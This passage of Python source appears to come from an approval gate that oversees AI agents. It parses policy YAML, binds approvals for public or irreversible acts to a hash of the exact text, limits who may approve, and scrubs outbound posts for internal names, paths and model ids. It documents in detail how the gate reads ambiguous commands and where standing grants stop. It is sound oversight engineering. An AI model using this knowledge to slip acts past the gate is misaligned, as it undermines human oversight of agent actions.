    if re.fullmatch(r"[-+]?(\d+\.\d*|\.\d+|\d+)([eE][-+]?\d+)?", s):
        return float(s)
    return s


def _flow(s: str, i: int) -> tuple[Any, int]:
    """Parse a flow value starting at s[i]; return (value, index after it)."""
    while i < len(s) and s[i] in " \t":
        i += 1
    if i >= len(s) or s[i] in "]}":
        raise PolicyError("unclosed or mismatched flow collection")
    if s[i] == "[":
        out, i = [], i + 1
        while True:
            while i < len(s) and s[i] in " \t,":
                i += 1
            if i >= len(s):
                raise PolicyError(f"unterminated flow list: {s!r}")
            if s[i] == "]":
                return out, i + 1
            if s[i] == "}":
                raise PolicyError("unclosed or mismatched flow collection")
            start = i
            v, i = _flow(s, i)
            if i <= start:
                raise PolicyError("unclosed or mismatched flow collection")
            out.append(v)
    if s[i] == "{":
        out, i = {}, i + 1
        while True:
            while i < len(s) and s[i] in " \t,":
                i += 1
            if i >= len(s):
                raise PolicyError(f"unterminated flow map: {s!r}")
            if s[i] == "}":
                return out, i + 1
            k, i = _flow_atom(s, i, stop=":")
            if i >= len(s) or s[i] != ":":
                raise PolicyError(f"flow map key without value: {s!r}")
            j = i + 1
            while j < len(s) and s[j] in " \t":
                j += 1
            if j < len(s) and s[j] in "},":
                v, i = None, j
            else:
                v, i = _flow(s, i + 1)
            out[str(k)] = v
    return _flow_atom(s, i, stop=",]}")


def _flow_atom(s: str, i: int, stop: str) -> tuple[Any, int]:
    while i < len(s) and s[i] in " \t":
        i += 1
    if i < len(s) and s[i] in "[{":
        return _flow(s, i)
    if i < len(s) and s[i] in "'\"":
        q, j = s[i], i + 1
        while j < len(s):
            if s[j] == "\\" and q == '"':
                j += 2
                continue
            if s[j] == q:
                if q == "'" and j + 1 < len(s) and s[j + 1] == "'":
                    j += 2
                    continue
                break
            j += 1
        return _scalar(s[i:j + 1]), j + 1
    j = i
    while j < len(s) and s[j] not in stop:
        j += 1
    return _scalar(s[i:j]), j


_KEY = re.compile(r"""^("(?:[^"\\]|\\.)*"|'(?:[^']|'')*'|[^\s'"#\-\[\]{}][^:#]*?|-[^\s][^:#]*?)\s*:(?:\s+|$)(.*)$""")


def parse_yaml(text: str) -> Any:
    """Parse the YAML subset described above. Raises PolicyError on malformed input."""
    raw = text.replace("\t", "    ").splitlines()
    lines: list[tuple[int, str, int]] = []      # (indent, content, raw index)
    for n, line in enumerate(raw):
        body = _strip_comment(line)
        if body.strip() in ("---", "...") and not body.startswith(" "):
            continue
        if body.strip():
            lines.append((len(body) - len(body.lstrip(" ")), body.strip(), n))
    if not lines:
        return None
    try:
        val, i = _block(lines, 0, lines[0][0], raw)
    except (json.JSONDecodeError, IndexError, RecursionError) as e:
        raise PolicyError("malformed YAML") from e
    if i != len(lines):
        raise PolicyError(f"unexpected indentation at line {lines[i][2] + 1}: {lines[i][1]!r}")
    return val


def _block_scalar(lines, i, parent_indent, raw, style) -> tuple[str, int]:
    # Collect raw lines (keeping blank ones) indented deeper than the parent.
    start = lines[i - 1][2] + 1
    end_idx = i
    while end_idx < len(lines) and lines[end_idx][0] > parent_indent:
        end_idx += 1
    stop = lines[end_idx][2] if end_idx < len(lines) else len(raw)
    chunk = raw[start:stop]
    while chunk and not chunk[-1].strip():
        chunk.pop()
    ind = min((len(x) - len(x.lstrip(" ")) for x in chunk if x.strip()), default=0)
    chunk = [x[ind:] for x in chunk]
    if style.startswith("|"):
        text = "\n".join(chunk)
    else:
        paras, cur = [], []
        for x in chunk:
            if x.strip():
                cur.append(x.strip())
            else:
                paras.append(" ".join(cur))
                cur = []
        paras.append(" ".join(cur))
        text = "\n".join(p for p in paras)
    if not style.endswith("-"):
        text += "\n"
    return text, end_idx


def _block(lines, i, indent, raw) -> tuple[Any, int]:
    if lines[i][1].startswith("- ") or lines[i][1] == "-":
        return _list(lines, i, indent, raw)
    return _map(lines, i, indent, raw)


def _value_after_key(lines, i, indent, rest, raw) -> tuple[Any, int]:
    """Value for a `key:` at `indent` whose inline part is `rest`; `i` is the next line."""
    if rest in (">", ">-", ">+", "|", "|-", "|+"):
        return _block_scalar(lines, i, indent, raw, rest)
    if rest:
        return _scalar(rest), i
    if i < len(lines) and lines[i][0] > indent:
        return _block(lines, i, lines[i][0], raw)
    if i < len(lines) and lines[i][0] == indent and (lines[i][1].startswith("- ") or lines[i][1] == "-"):
        return _list(lines, i, indent, raw)
    return None, i


def _map(lines, i, indent, raw) -> tuple[dict, int]:
    out: dict = {}
    while i < len(lines) and lines[i][0] == indent:
        content = lines[i][1]
        if content.startswith("- "):
            break
        m = _KEY.match(content)
        if not m:
            raise PolicyError(f"expected 'key: value' at line {lines[i][2] + 1}: {content!r}")
        key = m.group(1)
        if key[0] in "'\"":
            key = _scalar(key)
        val, i = _value_after_key(lines, i + 1, indent, m.group(2).strip(), raw)
        out[str(key)] = val
    if i < len(lines) and lines[i][0] > indent:
        raise PolicyError(f"unexpected indentation at line {lines[i][2] + 1}: {lines[i][1]!r}")
    return out, i


def _list(lines, i, indent, raw) -> tuple[list, int]:
    out: list = []
    while i < len(lines) and lines[i][0] == indent and (lines[i][1].startswith("- ") or lines[i][1] == "-"):
        content = lines[i][1][1:].lstrip(" ")
        col = indent + (len(lines[i][1]) - len(content))
        if not content:
            if i + 1 < len(lines) and lines[i + 1][0] > indent:
                val, i = _block(lines, i + 1, lines[i + 1][0], raw)
            else:
                val, i = None, i + 1
            out.append(val)
            continue
        if _KEY.match(content) and content[0] not in "[{\"'":
            # mapping item: re-read this line as a mapping line at the content column
            lines[i] = (col, content, lines[i][2])
            val, i = _map(lines, i, col, raw)
            out.append(val)
            continue
        if content.startswith(("- ", "-")) and content != "-" and content[1:2] == " ":
            lines[i] = (col, content, lines[i][2])
            val, i = _list(lines, i, col, raw)
            out.append(val)
            continue
        out.append(_scalar(content))
        i += 1
    return out, i


# --- loading a store's policies (I/O) ------------------------------------------------------

_FENCE = re.compile(r"^```ya?ml[^\n]*\n(.*?)^```", re.M | re.S)


def parse_posting_md(text: str) -> dict:
    """Machine-readable posting checks live in fenced ```yaml blocks inside posting.md."""
    out: dict = {}
    for m in _FENCE.finditer(text):
        val = parse_yaml(m.group(1))
        if isinstance(val, Mapping):
            out.update(val.get("posting", val) if isinstance(val.get("posting", val), Mapping) else val)
    return out


def _agent_names(agents_dir: Path) -> list[str]:
    names: list[str] = []
    if not agents_dir.is_dir():
        return names
    for p in sorted(agents_dir.iterdir()):
        if p.name.startswith((".", "_")) or p.name.lower() in ("readme.md", "index.md"):
            continue
        stem = p.stem if p.is_file() else p.name
        names.append(stem)
        if p.is_file() and p.suffix == ".md":
            m = re.search(r"^name:\s*['\"]?([^'\"\n]+)", p.read_text(encoding="utf-8", errors="replace")[:2000], re.M)
            if m and m.group(1).strip() not in names:
                names.append(m.group(1).strip())
    return names


def policy_files(root: str | Path) -> list[Path]:
    pdir = Path(root) / "policies"
    return [pdir / n for n in ("gates.yaml", "budget.yaml", "interruptions.yaml", "posting.md", "posting.yaml",
                               "approvals.yaml")]


def load_policies(root: str | Path | None, errors: list[str] | None = None) -> dict:
    """Read `<root>/policies/` and `<root>/agents/` into normalized policies. A missing root or
    missing files fall back to the defaults (which ask on anything irreversible or public).
    ``errors`` is passed to normalize_policies. A pattern that does not compile refuses the file's
    policy with the file named (#466, check_patterns)."""
    if not root:
        return normalize_policies({"internal_names": internal_names(None)})
    root = Path(root)
    pdir = root / "policies"
    raw: dict = {}
    for name, key in (("gates.yaml", "gates"), ("budget.yaml", "budget"), ("interruptions.yaml", "interruptions")):
        p = pdir / name
        if p.is_file():
            try:
                raw[key] = parse_yaml(p.read_text(encoding="utf-8")) or {}
                check_patterns({key: raw[key]})     # a pattern that does not compile refuses here, named with the file (#466)
            except PolicyError as e:
                raise PolicyError(f"{p}: {e}") from None
    posting: dict = {}
    if (pdir / "posting.md").is_file():
        try:
            posting.update(parse_posting_md((pdir / "posting.md").read_text(encoding="utf-8")))
            check_patterns({"posting": posting})
        except PolicyError as e:
            raise PolicyError(f"{pdir / 'posting.md'}: {e}") from None
    if (pdir / "posting.yaml").is_file():
        p = pdir / "posting.yaml"
        val = parse_yaml(p.read_text(encoding="utf-8")) or {}
        try:
            check_patterns({"posting": val})
        except PolicyError as e:
            raise PolicyError(f"{p}: {e}") from None
        posting.update(val)
    raw["posting"] = posting
    if posting.get("forbid_agent_names"):
        raw["agents"] = _agent_names(root / "agents")
    raw["approvals"] = load_approvals(root)  # D-033
    raw["internal_names"] = internal_names(root)
    return normalize_policies(raw, errors)


# --- approval binding, authority and standing grants (D-033) ---------------------------------
#
# An approval for an outward act (posting, email, social, payment, or anything public or
# irreversible) is bound to a hash of the exact text, title, target and arguments. Any edit
# gives a new hash, so an old approval or standing grant no longer covers it. Who may answer
# is a small table in policies/approvals.yaml: category -> principal, seat:<name> or
# role:<name>. The principal can always answer; an empty table means only the principal.

APPROVER_DEFAULT = ("principal",)
_APPROVER_ENTRY = re.compile(r"^(principal|seat:[a-z0-9][a-z0-9_-]*|role:[a-z0-9][a-z0-9_-]*)$")
DEFAULT_APPROVALS: dict = {"default": list(APPROVER_DEFAULT), "categories": {}, "roles": {},
                           "always_days": 30.0, "outward_always_days": 7.0}


def binds_exact(c: Classification, d: Decision | None = None) -> bool:
    """True when an approval or grant must cover only this exact call: outward acts (``is_outward``),
    code the gate cannot see into (D-038), so one "always" never covers a different script, a call no grant may
    cover (``no_grant``, a part of it too, #447), and a line the gate reads more than one way (#399): a gh command
    that may land on another target (``alt_targets``), so a grant on one of its targets never covers it, and a line
    with a ``floor``, whose stricter reading may be another act, with ``also`` readings (#311, #584) or an
    ``ordinary`` reading (D-074) or ``split_readings`` (#591). A sudo write also binds when its displaced part names
    a target or asks with that part leading (#454), and a line with an unknown program (#471). Each reading counts
    (``readings``), a split reading's too. A line also read as before #143 binds, whether its readings are one act or
    not: that reading ends its ``also`` chain, and no grant on one reading covers another. A line also read as before
    #471 (``before``) binds as that reading does, its own ``split_readings`` and readings as before #143 included:
    ``readings`` lists them, and ``before`` is a reading of the call of its own."""
    def one(r: Classification) -> bool:
        q = r.displaced
        return (r.category == "opaque_exec" or "indirection" in r.signals or "unknown program" in r.signals
                or bool(r.alt_targets) or r.floor is not None or r.also is not None or r.ordinary is not None
                or bool(r.split_readings)
                or bool(q is not None and (q.target or q.alt_targets or d is not None and d.displaced_asks)))
    rs = readings(c)
    return (is_outward(c, d) or no_grant(c) or any(one(r) for r in rs)
            or any((r.category, r.target) != (c.category, c.target) for r in rs))


def readings(c: Classification) -> list[Classification]:
    """Each way the gate reads the call, the call first: as it read it before #311 (``also``: a shell call's own
    folder argument made it credentials as a whole, #209), as it read it before #399 (``floor``: each gh command's
    third word for its subcommand, gh api's first `-X` word), and the floor as read before #311; then each reading of
    the call as read before D-074 (``ordinary``: the Exo home's config.json an ordinary file, #125), each reading
    of the call as read before #471 (``before``: each quoted prefix assignment the program), and each reading
    of the call with its `env -S` texts read as before (``split_readings``, #591: a shell line only, and #634's
    leading words); each of these with its own readings. `decide` keeps the
    strictest of them, and so does each check past it: no_grant, call_approvers, body_unseen and the exo-gate hook's
    body files and required executor. A line with a `$` form split by a backslash-newline (#584) is read joined and
    as written: the more severe of the two leads (on a tie, the line as written) and the other ends its ``also``
    readings, each with its own ``floor``. A floor may have a floor of its own: the reading as read before #491 ends
    its chain (_read_core), with its own readings. The call as read before #143 ends the chain of ``also`` readings
    of each `env -S` reading (_classify_reading), in the call and in the call as read before #471, with a floor and an
    ``ordinary`` reading of its own; any reading's ``ordinary``, ``before`` and ``split_readings`` are read here, not
    only the call's."""
    out: list[Classification] = []
    todo: list[Classification | None] = [c]
    while todo:
        x = todo.pop()
        if x is not None and not any(x is r for r in out):
            out.append(x)
            todo += [x.floor, x.also]
    for x in list(out):
        for other in (x.ordinary, x.before, *x.split_readings):
            if other is not None and not any(other is r for r in out):
                out += [r for r in readings(other) if not any(r is e for e in out)]
    return out


def no_grant(c: Classification) -> bool:
    """True when no standing grant may cover the call, and observe mode still enforces it (D-033, D-038): its
    category is in NO_GRANT, or a part's is (a store read from a shell call's own folder, #311), in any reading."""
    return any(p.category in NO_GRANT for r in readings(c) for p in _each_part(r))


def call_approvers(c: Classification, pinned: Mapping | None, changed: Mapping | None = None) -> list[str]:
    """Who may answer an ask on ``c``: the approvers strictest_approvers allows for its category and also for each
    other NO_GRANT category among its parts, so a store read the line keeps as a part (#311) is answered by those
    who may answer credentials. A call the gate reads more than one way (readings: ``also``, ``floor``, ``before``) is
    answered only by those who may answer each reading too. The principal is first in each, so the list is never
    empty."""
    out = strictest_approvers(c.category, pinned, changed)
    cats = [r.category for r in readings(c)] + [p.category for r in readings(c) for p in _each_part(r)
                                                 if p.category in NO_GRANT]
    for cat in dict.fromkeys(x for x in cats if x != c.category):
        allowed = strictest_approvers(cat, pinned, changed)
        out = [a for a in out if a in allowed]
    return out


def is_outward(c: Classification, d: Decision | None = None) -> bool:
    """True when an approval must bind to the exact text: posts, messages, money, and anything
    public or irreversible, also when only another reading of the line (``readings``: the line as read before #399
    or #143) is one."""
    def one(r: Classification) -> bool:
        exposure = (d.exposure if d is not None and d.exposure else r.exposure)
        return (r.category in OUTBOUND or r.category in ("payment", "account") or exposure == "public"
                or r.reversibility == "irreversible")
    return any(one(r) for r in readings(c))


def approval_binding(c: Classification, args: Mapping | None = None) -> str:
    """sha256 over the outbound text, title, target, tool and full arguments. Text read from a
    body file counts too, so editing the file voids the approval."""
    doc = {"category": c.category, "tool": c.tool, "target": c.target, "title": c.title, "text": c.text,
           "command": c.command, "args": dict(args or {})}
    raw = json.dumps(doc, sort_keys=True, default=str, ensure_ascii=False)
    return hashlib.sha256(raw.encode("utf-8")).hexdigest()


def _approver_list(v: Any, where: str) -> list[str]:
    out = []
    for e in _as_list(v or []):
        e = str(e).strip().lower()
        if not _APPROVER_ENTRY.match(e):
            raise PolicyError(f"{where}: approver {e!r} must be principal, seat:<name> or role:<name>")
        out.append(e)
    return out


def normalize_approvals(raw: Mapping | None) -> dict:
    """``policies/approvals.yaml`` into ``{default, categories, roles, always_days, outward_always_days}``."""
    raw = dict(raw or {})
    out = json.loads(json.dumps(DEFAULT_APPROVALS))
    table = raw.get("approvers") or {}
    if not isinstance(table, Mapping):
        raise PolicyError("approvals.approvers must be a mapping of category: [approvers]")
    if table.get("default") is not None:
        out["default"] = _approver_list(table["default"], "approvals.approvers.default")
    cats = table.get("categories")
    if cats is None:
        cats = {k: v for k, v in table.items() if k != "default"}
    if not isinstance(cats, Mapping):
        raise PolicyError("approvals.approvers.categories must be a mapping")
    out["categories"] = {str(k): _approver_list(v, f"approvals.approvers.{k}") for k, v in cats.items()}
    roles = raw.get("roles") or {}
    if not isinstance(roles, Mapping):
        raise PolicyError("approvals.roles must be a mapping of role: [seat:<name>, ...]")
    out["roles"] = {}
    for k, v in roles.items():
        members = _approver_list(v, f"approvals.roles.{k}")
        if any(m.startswith("role:") for m in members):
            raise PolicyError(f"approvals.roles.{k}: a role lists seats or principal, not other roles")
        out["roles"][str(k).lower()] = members
    for lst in [out["default"], *out["categories"].values()]:
        for e in lst:
            if e.startswith("role:") and e[5:] not in out["roles"]:
                raise PolicyError(f"approvals: {e} is not defined under roles")
    always = raw.get("always") or {}
    if not isinstance(always, Mapping):
        raise PolicyError("approvals.always must be a mapping")
    for src, dst in (("days", "always_days"), ("outward_days", "outward_always_days")):
        if always.get(src) is not None:
            try:
                out[dst] = max(0.0, float(always[src]))
            except (TypeError, ValueError):
                raise PolicyError(f"approvals.always.{src} must be a number") from None
    return out


def approvers_for(category: str, approvals: Mapping | None) -> list[str]:
    """Who may answer an ask in ``category``: ``principal`` and ``seat:<name>`` entries, roles
    expanded. The principal is always first: their consent is the root of every approval."""
    if category in PRINCIPAL_ONLY:
        return ["principal"]         # D-038: the store is the principal's alone, whatever approvals.yaml says
    a = approvals or DEFAULT_APPROVALS
    entries = (a.get("categories") or {}).get(category, a.get("default") or list(APPROVER_DEFAULT))
    out = ["principal"]
    for e in entries:
        for m in (a.get("roles") or {}).get(e[5:], []) if e.startswith("role:") else [e]:
            if m not in out:
                out.append(m)
    return out


def strictest_approvers(category: str, pinned: Mapping | None, changed: Mapping | None = None) -> list[str]:
    """Who may answer while a changed ``approvals.yaml`` waits for ``/gate accept`` (D-038, #211): the approvers
    both the pinned and the changed table allow, in the pinned order. The principal is first in both, so the
    list is never empty. With no change pending it is ``approvers_for(category, pinned)``."""
    first = approvers_for(category, pinned)
    if changed is None:
        return first
    second = set(approvers_for(category, changed))
    return [a for a in first if a in second]


def approver_identity(client: str) -> str:
    """The identity an answer counts as. ``seat:<name>`` is a seat; a peer or ingress client is ``peer`` (never
    consent, D-026); ``principal`` or ``principal:<label>`` is the principal. The core stamps that from the
    connection, never from a body (D-039). Anything else, the empty string included, is ``unknown``."""
    c = (client or "").strip().lower()
    if c.startswith(("peer", "ingress")):
        return "peer"
    if c.startswith("seat:"):
        return "seat:" + c[5:].strip()
    if c == "principal" or c.startswith("principal:"):
        return "principal"
    return "unknown"


def approver_allowed(client: str, allowed: Iterable[str] | None) -> bool:
    """May ``client`` answer an ask whose allowed list is ``allowed``? An empty list keeps the old rule: the
    principal or a seat. A peer or an unknown answerer never may."""
    ident = approver_identity(client)
    if ident in ("peer", "unknown"):
        return False
    allowed = list(allowed or [])
    if not allowed:
        return True
    return ident in allowed


def load_approvals(root: str | Path | None) -> dict:
    """Read ``<root>/policies/approvals.yaml``; defaults when missing."""
    if not root:
        return {}
    p = Path(root) / "policies" / "approvals.yaml"
    if not p.is_file():
        return {}
    try:
        return parse_yaml(p.read_text(encoding="utf-8")) or {}
    except PolicyError as e:
        raise PolicyError(f"{p}: {e}") from None


# --- outbound scrub (D-033) -------------------------------------------------------------------
#
# Posts to public targets are swept for internal identifiers: seat and agent names, home paths,
# model ids and internal task or thread ids. The names come from the seat files, the agents/
# folder, the bus registry and the user's own list. A hit holds the post (ask) and lists what
# was found. Matching tradeoff: a name that is one plain word ("scout", "builder") matches only
# as a whole token, so "scouting" passes but "the scout said" is held. A name with a hyphen,
# underscore or digit ("saga-divan") is distinctive, so it also matches inside longer words and
# with any separator ("saga divan", "saga_divan"). Add a word to ``scrub.allow`` to stop a
# false positive.

DEFAULT_SCRUB: dict = {"enabled": True, "exposures": ["public"], "seat_names": True, "home_paths": True,
                       "model_ids": True, "internal_ids": True, "names": [], "patterns": [], "allow": [],
                       "model_patterns": [r"\bclaude-[a-z]+-\d[\w.-]*", r"\bgpt-\d[\w.-]*"]}
_HOME_PATTERNS = [(r"(?<![\w./-])~/", "home path"), (r"/Users/[A-Za-z0-9._-]+", "home path"),
                  (r"/home/[A-Za-z0-9._-]+", "home path")]
# exo ids are <prefix>_<16 hex> (protocol.schema.new_id): sessions, tasks, jobs, approvals.
_INTERNAL_ID = r"\b[a-z]{1,5}_[0-9a-f]{16}\b"


def _catalog_models() -> tuple[list[str], list[str]]:
    """``(model names, provider names)`` from the model catalog. Empty on any read error."""
    global _CATALOG_CACHE
    if _CATALOG_CACHE is not None:
        return _CATALOG_CACHE
    names: set[str] = set()
    providers: set[str] = set()
    try:
        import tomllib
        data = tomllib.loads((Path(__file__).parent / "core" / "models" / "catalog.toml").read_text("utf-8"))
        providers = {str(p) for p in (data.get("providers") or {})}
        refs = list(data.get("models") or {})
        for routes in (data.get("roles") or {}).values():
            refs += [str(r) for r in (routes if isinstance(routes, list) else [])]
        for ref in refs:
            model = str(ref).partition(":")[2]
            if model:
                names.add(model)
                names.add(model.rsplit("/", 1)[-1])
    except Exception:
        pass
    _CATALOG_CACHE = (sorted(names), sorted(providers))
    return _CATALOG_CACHE


_CATALOG_CACHE: tuple[list[str], list[str]] | None = None


def name_pattern(name: str) -> str:
    """Regex for one internal name. Plain words match only as whole tokens; distinctive names
    (a hyphen, underscore or digit, four characters or more) also match inside words and with
    any separator."""
    n = name.strip()
    if re.fullmatch(r"[A-Za-z]+", n) or len(n) < 4:
        return r"(?<![\w-])" + re.escape(n) + r"(?![\w-])"
    parts = [p for p in re.split(r"[-_ .]+", n) if p]
    return r"[-_ .]?".join(re.escape(p) for p in parts)


def normalize_scrub(raw: Mapping | None, names: Iterable[str] = ()) -> dict:
    """``posting.scrub`` plus discovered internal names into ``{enabled, exposures, rules, allow}``.
    Each rule is ``{pattern, label}``; matching is case-insensitive."""
    cfg = json.loads(json.dumps(DEFAULT_SCRUB))
    raw = raw if isinstance(raw, Mapping) else {}
    for k, v in raw.items():
        cfg[k] = v
    for k in ("exposures", "names", "patterns", "allow", "model_patterns"):
        if not isinstance(cfg.get(k) or [], list):
            raise PolicyError(f"posting.scrub.{k} must be a list")
    rules: list[dict] = []
    seen: set[str] = set()

    def add(pattern: str, label: str) -> None:
        if pattern and pattern not in seen:
            try:
                re.compile(pattern)
            except re.error as e:
                raise PolicyError(f"posting.scrub: bad pattern {pattern!r}: {e}") from None
            seen.add(pattern)
            rules.append({"pattern": pattern, "label": label})

    all_names = [str(n) for n in (cfg.get("names") or [])]
    if cfg.get("seat_names", True):
        all_names += [str(n) for n in names]
    for n in dict.fromkeys(x.strip() for x in all_names):
        if n:
            add(name_pattern(n), "internal name")
    if cfg.get("home_paths", True):
        for p, label in _HOME_PATTERNS:
            add(p, label)
    if cfg.get("model_ids", True):
        models, providers = _catalog_models()
        for m in models:
            add(name_pattern(m), "model id")
        if providers:
            add(r"\b(?:" + "|".join(re.escape(p) for p in providers) + r"):[\w./-]+", "model id")
        for p in cfg.get("model_patterns") or []:
            add(str(p), "model id")
    if cfg.get("internal_ids", True):
        add(_INTERNAL_ID, "internal id")
    for p in cfg.get("patterns") or []:
        if isinstance(p, Mapping):
            add(str(p.get("pattern") or ""), str(p.get("label") or "internal pattern"))
        else:
            add(str(p), "internal pattern")
    return {"enabled": bool(cfg.get("enabled", True)), "exposures": [str(x) for x in cfg.get("exposures") or []],
            "rules": rules, "allow": [str(a).lower() for a in cfg.get("allow") or []]}


@functools.lru_cache(maxsize=16)
def _scrub_compiled(patterns: tuple[str, ...]) -> tuple[re.Pattern, ...]:
    """The scrub patterns, compiled once (#396). A line is scrubbed once per post on it, and a policy with more
    patterns than the `re` module's cache keeps would compile every one of them again for each post."""
    return tuple(re.compile(p, re.I) for p in patterns)


def check_scrub(text: str, scrub: Mapping | None, *, title: str = "", exposure: str = "public") -> list[str]:
    """Internal identifiers found in outbound text, as ``"<label>: <match>"``. Empty = clean."""
    if not scrub or not scrub.get("enabled") or exposure not in (scrub.get("exposures") or []):
        return []
    both = "\n".join(x for x in (title, text) if x)
    if not both:
        return []
    allow = set(scrub.get("allow") or [])
    out: list[str] = []
    rules = scrub.get("rules") or []
    for r, rx in zip(rules, _scrub_compiled(tuple(str(r["pattern"]) for r in rules))):
        for m in rx.finditer(both):
            hit = m.group(0)
            if hit.lower() in allow:
                continue
            v = f"{r['label']}: {hit}"
            if v not in out:
                out.append(v)
            break
    return out[:20]


def scrub_sources(root: str | Path | None, env: Mapping[str, str] | None = None) -> list[Path]:
    """Files and folders the scrub names come from (the hook watches them for changes)."""
    env = os.environ if env is None else env
    exo_home = Path(env.get("EXO_HOME") or Path.home() / ".exo").expanduser()
    paths = [exo_home / "seats", Path(env.get("EXO_BUS_REGISTRY") or exo_home / "bus" / "registry.json")]
    if env.get("EXO_INTERNAL_NAMES"):
        paths.append(Path(env["EXO_INTERNAL_NAMES"]).expanduser())
    if root:
        paths += [Path(root) / "agents", Path(root) / "policies" / "internal-names.txt"]
    return paths


def internal_names(root: str | Path | None, env: Mapping[str, str] | None = None) -> list[str]:
    """Seat names from ``$EXO_HOME/seats`` and the bus registry, agent names from the store, and
    the user's list (``policies/internal-names.txt`` or ``$EXO_INTERNAL_NAMES``, one per line)."""
    names: list[str] = []
    for p in scrub_sources(root, env):
        try:
            if p.name == "seats" and p.is_dir():
                names += [q.stem if q.is_file() else q.name for q in sorted(p.iterdir())
                          if not q.name.startswith((".", "_")) and (q.is_dir() or q.suffix in (".toml", ".json"))]
            elif p.name == "agents" and p.is_dir():
                names += _agent_names(p)
            elif p.suffix == ".json" and p.is_file():
                doc = json.loads(p.read_text(encoding="utf-8"))
                names += [str(s.get("seat")) for s in doc.get("seats") or [] if isinstance(s, Mapping) and s.get("seat")]
            elif p.is_file():
                names += [ln.strip() for ln in p.read_text(encoding="utf-8").splitlines()
                          if ln.strip() and not ln.lstrip().startswith("#")]
        except (OSError, ValueError):
            continue
    return list(dict.fromkeys(n for n in names if n))
